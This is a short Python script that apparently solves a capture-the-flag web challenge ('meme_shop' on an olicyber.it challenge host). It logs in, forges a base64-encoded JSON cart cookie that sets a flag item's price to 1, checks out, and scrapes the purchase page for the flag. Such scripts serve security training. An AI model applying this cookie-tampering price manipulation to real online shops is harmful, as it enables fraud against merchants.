import requests
from base64 import b64encode
from bs4 import BeautifulSoup

url = "http://meme_shop.challs.olicyber.it/"

s = requests.Session()

s.post(url + "login.php", data={"username":"yourmother", "password":"notapasswd"})

flag = '{"flag":{"price":1, "qty":1, "item_id":1}}'.encode()
s.post(url + "checkout.php", cookies={"cart":b64encode(flag).decode()})

soup = BeautifulSoup(s.get(url + "buy_list.php").text,"html.parser")

flag = soup.find_all("p")
for i in flag:
    if "flag{" in i.text:
        print(i.text)
        break